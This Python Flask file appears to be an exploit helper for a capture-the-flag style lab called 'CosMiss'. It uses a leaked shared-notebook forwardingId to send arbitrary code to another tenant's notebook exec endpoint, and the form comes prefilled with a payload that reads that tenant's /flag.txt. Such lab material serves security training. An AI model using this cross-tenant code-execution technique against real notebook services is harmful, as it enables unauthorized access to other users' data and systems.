"""Cross-tenant notebook access via leaked forwardingId."""
import os
import urllib.parse

import requests
from flask import Flask, request

app = Flask(__name__)
FRONT = os.environ.get("FRONT_URL", "http://front-end:5000")

HTML = """<h1>CosMiss — Notebook Front-End</h1>
<p>Step 1: browse the notebook service front page and look for a shared
notebook link; grab its forwardingId.</p>
<p>Step 2: call the exec endpoint with arbitrary code and read the victim
tenant's flag from <code>/flag.txt</code>.</p>
<form method="post">
  forwardingId: <input name="fwd" size="50" value="fwd-8c1d4e5f-6a2b-4c3d-8e9f-000000000002"><br>
  code: <input name="code" size="60" value="print(open('/flag.txt').read())"><br>
  <button>Execute</button>
</form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/", methods=["POST"])
def run():
    fwd = request.form.get("fwd", "")
    code = request.form.get("code", "")
    try:
        r = requests.get(f"{FRONT}/notebook/{fwd}/exec", params={"code": code}, timeout=10)
        return HTML.replace("{{out}}", f"HTTP {r.status_code}\n{r.text}")
    except Exception as e:
        return HTML.replace("{{out}}", f"error: {e}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
